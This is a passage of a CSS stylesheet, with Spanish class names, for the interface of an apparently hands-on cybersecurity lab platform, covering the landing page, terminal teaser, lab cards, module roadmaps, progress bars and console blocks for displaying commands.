}

.hamburguesa-activa .hamb-3 {
  transform: translateY(-7px) rotate(-45deg);
}

/* Drawer / Menú lateral overlay */
.hamburguesa-backdrop {
  position: fixed;
  inset: 0;
  z-index: 100;
  background: rgba(0, 0, 0, 0.7);
  backdrop-filter: blur(8px);
  display: flex;
  justify-content: flex-end;
  animation: aparecer 0.2s ease;
}

.hamburguesa-drawer {
  width: 100%;
  max-width: 360px;
  height: 100%;
  background: #0f1216;
  border-left: 1px solid var(--borde);
  padding: 24px;
  display: flex;
  flex-direction: column;
  gap: 20px;
  box-shadow: -10px 0 40px rgba(0, 0, 0, 0.6);
  animation: slideDrawer 0.25s cubic-bezier(0.16, 1, 0.3, 1);
}

@keyframes slideDrawer {
  from {
    transform: translateX(100%);
  }

  to {
    transform: translateX(0);
  }
}

.drawer-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-bottom: 14px;
  border-bottom: 1px solid var(--borde);
}

.drawer-titulo {
  font-family: var(--fuente-display);
  font-size: 16px;
  font-weight: 700;
  color: #ffffff;
}

.drawer-btn-cerrar {
  width: 30px;
  height: 30px;
  background: transparent;
  border: 1px solid var(--borde);
  border-radius: 6px;
  color: var(--texto-muted);
  font-size: 13px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.15s ease;
}

.drawer-btn-cerrar:hover {
  border-color: var(--texto);
  color: #ffffff;
}

/* Bloque de IP en el Drawer */
.drawer-ip-box {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 12px 14px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 10px;
}

.drawer-ip-info {
  display: flex;
  flex-direction: column;
  gap: 2px;
}

.drawer-ip-label {
  font-family: var(--fuente-mono);
  font-size: 10px;
  color: var(--texto-muted);
  text-transform: uppercase;
}

.drawer-ip-val {
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 600;
  color: var(--acento);
}

.btn-drawer-ip {
  font-size: 11px;
  padding: 5px 10px;
}

/* Enlaces del Drawer */
.drawer-links {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.drawer-link-item {
  display: flex;
  align-items: center;
  gap: 14px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 14px 16px;
  cursor: pointer;
  text-align: left;
  transition: all 0.18s ease;
  width: 100%;
}

.drawer-link-item:hover {
  border-color: var(--acento);
  background: var(--superficie-alt);
  transform: translateX(-3px);
}

.drawer-link-icon {
  width: 36px;
  height: 36px;
  border-radius: 8px;
  background: var(--acento-suave);
  color: var(--acento);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.drawer-link-icon.icon-roadmap {
  background: rgba(56, 189, 248, 0.12);
  color: #38bdf8;
}

.drawer-link-icon.icon-config {
  background: rgba(168, 85, 247, 0.12);
  color: #c084fc;
}

.drawer-link-textos {
  display: flex;
  flex-direction: column;
  flex: 1;
  gap: 2px;
}

.drawer-link-nombre {
  font-family: var(--fuente-display);
  font-size: 14px;
  font-weight: 700;
  color: #ffffff;
}

.drawer-link-desc {
  font-size: 11.5px;
  color: var(--texto-muted);
}

.drawer-link-arrow {
  font-family: var(--fuente-mono);
  font-size: 14px;
  color: var(--texto-muted);
  transition: transform 0.15s ease;
}

.drawer-link-item:hover .drawer-link-arrow {
  color: var(--acento);
  transform: translateX(3px);
}

/* ---------- Barras Superiores con Botón Volver ---------- */
.pagina-top-bar,
.camino-top-bar {
  display: flex;
  align-items: center;
  gap: 16px;
  margin-bottom: 24px;
}

.pagina-top-info {
  display: flex;
  flex-direction: column;
  text-align: left;
}

.pagina-top-titulo {
  font-family: var(--fuente-display);
  font-size: 22px;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
}

.btn-volver-ip {
  align-self: flex-start;
  margin-bottom: 16px;
  font-size: 12px;
  padding: 6px 12px;
}

.landing-hero {
  position: relative;
  max-width: 880px;
  margin: 0 auto;
  padding: 60px 24px 0;
  text-align: center;
}

.hero-node-badge {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: rgba(19, 22, 26, 0.85);
  border: 1px solid var(--borde);
  padding: 6px 16px;
  border-radius: 24px;
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--acento);
  letter-spacing: 0.5px;
  margin-bottom: 24px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
  backdrop-filter: blur(8px);
}

.hero-badge-dot {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--acento);
  box-shadow: 0 0 8px var(--acento);
}

.landing-titulo {
  font-family: var(--fuente-display);
  font-size: clamp(34px, 5.5vw, 54px);
  line-height: 1.12;
  font-weight: 800;
  letter-spacing: -1px;
  color: #ffffff;
  margin: 0 auto 20px;
  max-width: 22ch;
}

.titulo-gradiente {
  background: linear-gradient(135deg, #00e08a 0%, #38bdf8 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

.landing-descripcion {
  font-size: 16.5px;
  line-height: 1.65;
  color: #94a3b8;
  max-width: 62ch;
  margin: 0 auto 36px;
}

.landing-accesos {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 16px;
  margin-bottom: 48px;
  flex-wrap: wrap;
}

.btn-landing {
  padding: 13px 28px;
  font-family: var(--fuente-display);
  font-size: 14.5px;
  font-weight: 600;
  border-radius: 8px;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  transition: all 0.2s ease;
}

.btn-hero-glow {
  box-shadow: 0 0 20px rgba(0, 224, 138, 0.25);
}

.btn-hero-glow:hover {
  box-shadow: 0 0 28px rgba(0, 224, 138, 0.4);
}

/* Cinta de Métricas Rápidas */
.landing-metricas-strip {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  background: rgba(19, 22, 26, 0.7);
  border: 1px solid var(--borde);
  border-radius: 12px;
  padding: 12px 28px;
  gap: 24px;
  margin: 0 auto;
  backdrop-filter: blur(10px);
  flex-wrap: wrap;
}

.metrica-item {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 2px;
}

.metrica-val {
  font-family: var(--fuente-mono);
  font-size: 18px;
  font-weight: 800;
  color: #ffffff;
}

.metrica-txt {
  font-size: 11px;
  color: var(--texto-muted);
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.metrica-divisor {
  width: 1px;
  height: 28px;
  background: var(--borde);
}

/* ---------- Terminal Interactivo Teaser ---------- */
.landing-terminal-section {
  max-width: 920px;
  margin: 54px auto 0;
  padding: 0 24px;
}

.terminal-card {
  background: #090c0f;
  border: 1px solid var(--borde);
  border-radius: 12px;
  overflow: hidden;
  box-shadow: 0 20px 50px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(255, 255, 255, 0.03);
  text-align: left;
}

.terminal-topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 16px;
  background: #11151a;
  border-bottom: 1px solid var(--borde);
  gap: 12px;
  flex-wrap: wrap;
}

.terminal-dots {
  display: flex;
  gap: 6px;
}

.dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
}

.dot-red {
  background: #ef4444;
}

.dot-yellow {
  background: #f59e0b;
}

.dot-green {
  background: #10b981;
}

.terminal-tabs {
  display: flex;
  gap: 6px;
}

.terminal-tab {
  background: transparent;
  border: 1px solid transparent;
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 4px 10px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: all 0.15s ease;
}

.terminal-tab:hover {
  color: var(--texto);
  background: rgba(255, 255, 255, 0.03);
}

.terminal-tab.activo {
  background: var(--superficie);
  color: var(--acento);
  border-color: rgba(0, 224, 138, 0.3);
  font-weight: 600;
}

.tab-lab-badge {
  font-size: 9px;
  padding: 1px 5px;
  border-radius: 3px;
  background: rgba(255, 255, 255, 0.06);
  color: var(--texto-muted);
}

.terminal-tab.activo .tab-lab-badge {
  background: var(--acento-suave);
  color: var(--acento);
}

.terminal-title-tag {
  font-family: var(--fuente-mono);
  font-size: 10px;
  color: var(--texto-muted);
  letter-spacing: 0.5px;
}

.terminal-body {
  padding: 20px 22px;
  font-family: var(--fuente-mono);
  font-size: 13px;
  display: flex;
  flex-direction: column;
  gap: 12px;
  min-height: 120px;
}

.terminal-row {
  display: flex;
  gap: 10px;
  align-items: flex-start;
}

.terminal-prompt {
  color: var(--acento);
  font-weight: 700;
}

.terminal-cmd {
  color: #38bdf8;
  word-break: break-all;
}

.terminal-output {
  padding-left: 20px;
  border-left: 2px solid rgba(0, 224, 138, 0.3);
}

.terminal-output pre {
  margin: 0;
  color: #a7f3d0;
  font-family: inherit;
  font-size: 12px;
  line-height: 1.5;
  white-space: pre-wrap;
}

.terminal-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 10px 18px;
  background: #0d1014;
  border-top: 1px solid var(--borde);
  font-size: 12px;
  flex-wrap: wrap;
  gap: 8px;
}

.terminal-tag-pill {
  font-family: var(--fuente-mono);
  font-size: 11px;
  color: var(--texto-muted);
}

.terminal-tag-pill strong {
  color: #f1f5f9;
}

.terminal-cta-link {
  background: none;
  border: none;
  color: var(--acento);
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  padding: 0;
  transition: transform 0.15s ease;
}

.terminal-cta-link:hover {
  text-decoration: underline;
}

/* ---------- Laboratorios en el Home ---------- */
.landing-labs {
  position: relative;
  max-width: 960px;
  margin: 72px auto 0;
  padding: 0 24px;
}

.landing-labs-encabezado {
  display: flex;
  justify-content: space-between;
  align-items: flex-end;
  margin-bottom: 24px;
  text-align: left;
  flex-wrap: wrap;
  gap: 12px;
}

.landing-labs-encabezado h2 {
  font-family: var(--fuente-display);
  font-size: 24px;
  font-weight: 700;
  color: #ffffff;
  margin-top: 4px;
}

.link-roadmap {
  color: var(--acento);
  font-family: var(--fuente-mono);
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  transition: opacity 0.15s;
}

.link-roadmap:hover {
  opacity: 0.8;
  text-decoration: underline;
}

.landing-labs-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
  gap: 20px;
}

.mini-lab-pro {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 12px;
  padding: 24px;
  cursor: pointer;
  text-align: left;
  transition: all 0.2s ease;
  display: flex;
  flex-direction: column;
}

.mini-lab-pro:hover {
  border-color: var(--acento);
  background: var(--superficie-alt);
  transform: translateY(-4px);
  box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
}

.mini-lab-top {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 14px;
}

.mini-lab-icon-box {
  width: 42px;
  height: 42px;
  border-radius: 10px;
  background: var(--acento-suave);
  border: 1px solid rgba(0, 224, 138, 0.2);
  color: var(--acento);
  display: flex;
  align-items: center;
  justify-content: center;
}

.mini-lab-svg {
  width: 22px;
  height: 22px;
}

.mini-lab-badges {
  display: flex;
  gap: 6px;
  align-items: center;
}

.mini-lab-nivel {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: rgba(255, 255, 255, 0.7);
  background: rgba(255, 255, 255, 0.06);
  border: 1px solid var(--borde);
  padding: 2px 8px;
  border-radius: 12px;
}

.mini-lab-cat {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--acento2);
  text-transform: uppercase;
  margin-bottom: 6px;
  display: block;
}

.mini-lab-pro h3 {
  font-family: var(--fuente-display);
  font-size: 18px;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 8px;
}

.mini-lab-pro p {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.55;
  margin-bottom: 20px;
  flex: 1;
}

.mini-lab-bottom {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-top: 14px;
  border-top: 1px solid var(--borde);
  margin-top: auto;
}

.mini-lab-mod-count {
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  color: var(--texto-muted);
  display: flex;
  align-items: center;
}

.mini-lab-cta {
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 600;
  color: var(--acento);
}

/* ---------- Pilares / Beneficios ---------- */
.landing-pilares {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
  gap: 20px;
  max-width: 960px;
  margin: 64px auto 0;
  padding: 0 24px;
  text-align: left;
}

.pilar-card {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 10px;
  padding: 22px;
  transition: transform 0.2s ease, border-color 0.2s;
}

.pilar-card:hover {
  transform: translateY(-3px);
  border-color: #3b424f;
}

.pilar-icon {
  width: 38px;
  height: 38px;
  border-radius: 8px;
  background: rgba(56, 189, 248, 0.1);
  color: var(--acento2);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 14px;
}

.pilar-card h4 {
  font-family: var(--fuente-display);
  font-size: 15px;
  font-weight: 700;
  color: #ffffff;
  margin-bottom: 6px;
}

.pilar-card p {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.5;
}

/* Badge de puerto en la Pi */
.badge-puerto-pi {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: #38bdf8;
  background: rgba(56, 189, 248, 0.12);
  border: 1px solid rgba(56, 189, 248, 0.25);
  padding: 2px 7px;
  border-radius: 4px;
  letter-spacing: 0.3px;
}

/* Endpoint en el banner de DetalleLab */
.banner-url-endpoint {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-top: 10px;
}

.endpoint-label {
  font-family: var(--fuente-mono);
  font-size: 11px;
  color: var(--texto-muted);
}

.endpoint-code {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--acento);
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  padding: 2px 8px;
  border-radius: 4px;
}

.btn-accion-directa {
  padding: 10px 20px;
  font-weight: 600;
}

.btn-apagar-discreto {
  padding: 10px 16px;
  font-size: 12px;
}

/* Preview de módulos en Roadmap global */
.preview-label {
  display: block;
  font-size: 11px;
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  margin-bottom: 8px;
}

.chip-modulo-preview:focus,
.tarjeta-modulo:focus,
.tarjeta-paso:focus,
.cuadro-lab:focus,
.roadmap-lab-card:focus {
  outline: none;
  border-color: var(--acento);
}

/* ---------- Progreso y gamificación ---------- */

.cuadro-lab-progreso {
  align-self: flex-end;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  color: var(--texto-muted);
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  padding: 3px 8px;
  border-radius: 20px;
}

.progreso-seccion {
  margin-top: 32px;
}

.progreso-encabezado {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 10px;
}

.progreso-contador {
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
  color: var(--texto-muted);
}

.progreso-completo {
  color: var(--acento);
  font-weight: 600;
}

.barra-progreso {
  height: 6px;
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  border-radius: 20px;
  overflow: hidden;
  margin-bottom: 18px;
}

.barra-progreso-relleno {
  height: 100%;
  background: var(--acento);
  border-radius: 20px;
  transition: width 0.3s ease;
}

.lista-retos {
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.reto-item {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 10px 14px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  cursor: pointer;
  transition: border-color 0.15s, background 0.15s;
}

.reto-item:hover {
  border-color: var(--acento);
}

.reto-checkbox {
  width: 18px;
  height: 18px;
  border: 1px solid var(--borde);
  border-radius: 4px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 12px;
  color: var(--acento);
  flex-shrink: 0;
}

.reto-completado {
  background: var(--acento-suave);
  border-color: var(--acento);
}

.reto-completado .reto-checkbox {
  background: var(--acento);
  color: #06110c;
  border-color: var(--acento);
}

.reto-completado .reto-texto {
  color: var(--texto-muted);
  text-decoration: line-through;
}

.reto-texto {
  font-size: 13px;
  color: var(--texto);
}

/* =========================================================
   ROADMAP MODULAR POR LABORATORIO (Minimalista y Limpio)
   ========================================================= */

/* Barra superior en DetalleLab */
.detalle-barra-superior {
  display: flex;
  justify-content: flex-start;
  align-items: center;
  margin-bottom: 20px;
}

/* Banner de Control del Lab (Único lugar de la descripción) */
.detalle-banner-control {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 20px 24px;
  margin-bottom: 28px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 24px;
}

.banner-control-info {
  flex: 1;
}

.banner-top-tags {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 6px;
}

.banner-top-tags .etiqueta-comentario {
  margin-bottom: 0;
}

.detalle-banner-control .detalle-titulo {
  font-size: 24px;
  margin-bottom: 6px;
  color: #ffffff;
}

.detalle-descripcion-corta {
  color: var(--texto-muted);
  font-size: 14px;
  line-height: 1.5;
  max-width: 65ch;
}

.banner-control-acciones {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-shrink: 0;
}

.btn-abrir-destacado {
  font-weight: 600;
  padding: 9px 18px;
}

/* Contenedor del Roadmap por Laboratorio */
.roadmap-lab-container {
  margin-top: 8px;
}

.roadmap-lab-header {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 20px 24px;
  margin-bottom: 20px;
}

.roadmap-header-info {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 24px;
  margin-bottom: 16px;
}

.roadmap-seccion-nombre {
  font-size: 18px;
  font-weight: 600;
  color: var(--texto);
}

.roadmap-metricas {
  display: flex;
  gap: 12px;
  flex-shrink: 0;
}

.metrica-caja {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  border-radius: 6px;
  padding: 8px 14px;
  text-align: center;
  min-width: 90px;
}

.metrica-caja.metrica-porcentaje {
  border-color: rgba(0, 224, 138, 0.3);
  background: var(--acento-suave);
}

.metrica-caja.metrica-porcentaje .metrica-numero {
  color: var(--acento);
}

.metrica-numero {
  display: block;
  font-family: 'JetBrains Mono', monospace;
  font-size: 16px;
  font-weight: 700;
  color: var(--texto);
  margin-bottom: 2px;
}

.metrica-label {
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--texto-muted);
}

.barra-progreso-global {
  height: 4px;
  background: var(--superficie-alt);
  border-radius: 4px;
  overflow: hidden;
}

.barra-progreso-global-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 4px;
  transition: width 0.3s ease;
}

/* Filtros de nivel */
.roadmap-filtros-bar {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 20px;
}

.filtro-label {
  font-size: 12px;
  color: var(--texto-muted);
  font-family: 'JetBrains Mono', monospace;
}

.filtro-botones {
  display: flex;
  gap: 8px;
}

.btn-filtro {
  background: var(--superficie);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  padding: 5px 12px;
  font-size: 12px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.btn-filtro:hover {
  background: var(--superficie-alt);
  color: var(--texto);
  border-color: #3b424f;
}

.btn-filtro.activo {
  background: var(--acento-suave);
  color: var(--acento);
  border-color: var(--acento);
  font-weight: 600;
}

/* Layout Split: Módulos (Izq) y Pasos (Der) */
.roadmap-layout-split {
  display: grid;
  grid-template-columns: 340px 1fr;
  gap: 24px;
  align-items: start;
}

/* Columna Módulos */
.columna-modulos {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.lista-tarjetas-modulos {
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.tarjeta-modulo {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-left: 3px solid var(--borde);
  border-radius: 6px;
  padding: 14px 16px;
  cursor: pointer;
  transition: all 0.15s ease;
  text-align: left;
}

.tarjeta-modulo:hover {
  border-color: #3b424f;
  background: var(--superficie-alt);
}

.tarjeta-modulo.activa {
  background: #171b1f;
  border-color: var(--acento);
  border-left: 3px solid var(--acento);
}

.tarjeta-modulo.completa {
  border-left-color: var(--acento);
}

.tarjeta-modulo-top {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 6px;
}

.tarjeta-modulo-num {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  font-weight: 700;
  color: var(--texto-muted);
  background: var(--superficie-alt);
  padding: 1px 5px;
  border-radius: 3px;
}

.tarjeta-modulo.activa .tarjeta-modulo-num {
  color: var(--acento);
}

/* Badges de nivel */
.badge-nivel {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  font-weight: 600;
  text-transform: uppercase;
  padding: 1px 6px;
  border-radius: 4px;
}

.badge-nivel-básico {
  background: rgba(0, 224, 138, 0.12);
  color: #00e08a;
  border: 1px solid rgba(0, 224, 138, 0.25);
}

.badge-nivel-intermedio {
  background: rgba(255, 170, 0, 0.12);
  color: #ffaa00;
  border: 1px solid rgba(255, 170, 0, 0.25);
}

.badge-nivel-avanzado {
  background: rgba(168, 85, 247, 0.12);
  color: #c084fc;
  border: 1px solid rgba(168, 85, 247, 0.25);
}

.tarjeta-check-completado {
  margin-left: auto;
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: var(--acento);
}

.tarjeta-modulo-titulo {
  font-size: 13px;
  font-weight: 600;
  color: var(--texto);
  line-height: 1.4;
  margin-bottom: 8px;
}

.tarjeta-modulo-footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  padding-top: 6px;
  border-top: 1px solid rgba(255, 255, 255, 0.04);
}

.tarjeta-mini-progreso {
  flex: 1;
  height: 3px;
  background: var(--superficie-alt);
  border-radius: 3px;
  overflow: hidden;
}

.tarjeta-mini-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 3px;
  transition: width 0.2s ease;
}

.tarjeta-conteo-pasos {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: var(--texto-muted);
}

/* Columna de Pasos del Módulo */
.columna-pasos-modulo {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.panel-modulo-header {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 20px 24px;
}

.panel-modulo-top {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 8px;
}

.modulo-tag-numero {
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  font-weight: 700;
  color: var(--acento);
}

.panel-modulo-titulo {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 10px;
  color: #ffffff;
}

.panel-modulo-habilidad {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.5;
  margin-bottom: 12px;
}

.panel-modulo-habilidad strong {
  color: var(--texto);
}

.habilidad-chips {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-bottom: 16px;
}

.chip-req {
  font-size: 11px;
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  padding: 2px 8px;
  border-radius: 4px;
}

.modulo-barra-control {
  border-top: 1px solid var(--borde);
  padding-top: 14px;
}

.modulo-progreso-info {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 8px;
}

.progreso-texto-modulo {
  font-size: 12px;
  color: var(--texto-muted);
  font-family: 'JetBrains Mono', monospace;
}

.modulo-barra-progreso {
  height: 4px;
  background: var(--superficie-alt);
  border-radius: 4px;
  overflow: hidden;
}

.modulo-barra-fill {
  height: 100%;
  background: var(--acento);
  border-radius: 4px;
  transition: width 0.2s ease;
}

.btn-outline-sm {
  background: transparent;
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-size: 11px;
  padding: 4px 10px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.btn-outline-sm:hover {
  border-color: var(--acento);
  color: var(--acento);
}

/* Input simple para FormularioIp */
.input-ip-simple {
  width: 100%;
  background: #080a0c;
  border: 1px solid var(--borde);
  border-radius: 8px;
  color: #ffffff;
  font-family: var(--fuente-display);
  font-size: 15px;
  padding: 14px 16px;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.input-ip-simple:focus {
  border-color: var(--acento);
  box-shadow: 0 0 0 2px rgba(0, 224, 138, 0.2);
}

.input-ip-simple::placeholder {
  color: #4b5563;
}

.landing-tag-intro {
  display: inline-block;
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--acento);
  margin-bottom: 12px;
}

.mini-lab-cat {
  font-family: var(--fuente-mono);
  font-size: 10px;
  color: var(--acento2);
  background: rgba(56, 189, 248, 0.1);
  padding: 2px 7px;
  border-radius: 4px;
}

/* =========================================================
   LISTADO VISUAL Y ATRACTIVO DE PASOS POR MÓDULO
   ========================================================= */

.lista-pasos {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.tarjeta-paso-visual {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-left: 3px solid #2a313d;
  border-radius: 10px;
  padding: 18px 22px;
  cursor: pointer;
  text-align: left;
  transition: all 0.2s ease;
  position: relative;
}

.tarjeta-paso-visual:hover {
  border-color: #3b4453;
  border-left-color: var(--acento);
  background: var(--superficie-alt);
  transform: translateY(-2px);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
}

.tarjeta-paso-visual.paso-completado {
  background: rgba(0, 224, 138, 0.03);
  border-color: rgba(0, 224, 138, 0.35);
  border-left-color: var(--acento);
}

/* Header del Paso */
.paso-visual-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
}

.paso-checkbox-custom {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-shrink: 0;
}

.checkbox-indicador {
  width: 22px;
  height: 22px;
  border: 2px solid var(--borde);
  border-radius: 6px;
  background: var(--superficie-alt);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 12px;
  font-weight: 800;
  color: #06110c;
  transition: all 0.2s ease;
}

.tarjeta-paso-visual:hover .checkbox-indicador {
  border-color: var(--acento);
}

.checkbox-indicador.activo {
  background: var(--acento);
  border-color: var(--acento);
}

.paso-badge-orden {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: var(--acento);
  background: var(--acento-suave);
  padding: 2px 7px;
  border-radius: 4px;
  letter-spacing: 0.5px;
}

.paso-visual-titulo {
  font-family: var(--fuente-display);
  font-size: 16px;
  font-weight: 700;
  color: #ffffff;
  line-height: 1.3;
}

.tarjeta-paso-visual.paso-completado .paso-visual-titulo {
  color: #93e6be;
}

/* Fila de Ubicación ("Dónde") */
.paso-fila-ubicacion {
  display: flex;
  align-items: center;
  gap: 8px;
  background: #090c0f;
  border: 1px solid rgba(56, 189, 248, 0.2);
  border-radius: 6px;
  padding: 6px 12px;
  margin-bottom: 12px;
}

.tag-donde {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: var(--acento2);
  letter-spacing: 0.5px;
  flex-shrink: 0;
}

.valor-donde {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: #e2e8f0;
}

/* Instrucción ("Cómo") */
.paso-instruccion-como {
  font-size: 14px;
  color: #cbd5e1;
  line-height: 1.55;
  margin-bottom: 12px;
}

/* Consola interactiva para Comandos / Payloads */
.paso-consola-bloque {
  background: #06080a;
  border: 1px solid var(--borde);
  border-radius: 6px;
  overflow: hidden;
  margin-bottom: 12px;
}

.consola-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 6px 12px;
  background: #0f1318;
  border-bottom: 1px solid rgba(255, 255, 255, 0.04);
}

.consola-label {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 600;
  color: var(--texto-muted);
  letter-spacing: 0.5px;
}

.btn-consola-copiar {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  color: var(--texto);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 3px 10px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.btn-consola-copiar:hover {
  background: var(--acento);
  color: #06110c;
  border-color: var(--acento);
}

.consola-codigo {
  margin: 0;
  padding: 10px 14px;
  overflow-x: auto;
  font-family: var(--fuente-mono);
  font-size: 12px;
  line-height: 1.45;
  color: #38bdf8;
}

.consola-codigo code {
  font-family: inherit;
  white-space: pre-wrap;
  word-break: break-all;
}

/* Explicación / Fundamento ("Por qué") */
.paso-explicacion-porque {
  display: flex;
  align-items: flex-start;
  gap: 8px;
  background: rgba(255, 255, 255, 0.02);
  border-left: 2px solid rgba(0, 224, 138, 0.4);
  padding: 8px 12px;
  border-radius: 0 4px 4px 0;
  font-size: 12px;
  line-height: 1.5;
}

.tag-porque {
  font-family: var(--fuente-mono);
  font-size: 10px;
  font-weight: 700;
  color: var(--acento);
  letter-spacing: 0.5px;
  flex-shrink: 0;
  margin-top: 1px;
}

.texto-porque {
  color: #94a3b8;
}

/* Navegación al pie del módulo */
.navegacion-modulos-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 16px;
  padding-top: 20px;
  margin-top: 8px;
  border-top: 1px solid var(--borde);
}

.btn-nav-modulo {
  font-family: var(--fuente-display);
  font-size: 13px;
  font-weight: 600;
  padding: 9px 18px;
  border-radius: 6px;
}

.mensaje-fin-roadmap {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--acento);
  background: var(--acento-suave);
  padding: 6px 14px;
  border-radius: 4px;
}

/* =========================================================
   ROADMAP VISTA GLOBAL
   ========================================================= */

.roadmap-vista-global {
  display: flex;
  flex-direction: column;
  gap: 28px;
}

.roadmap-global-intro {
  max-width: 800px;
}

.roadmap-global-titulo {
  font-size: 26px;
  font-weight: 700;
  margin-bottom: 8px;
  color: #ffffff;
}

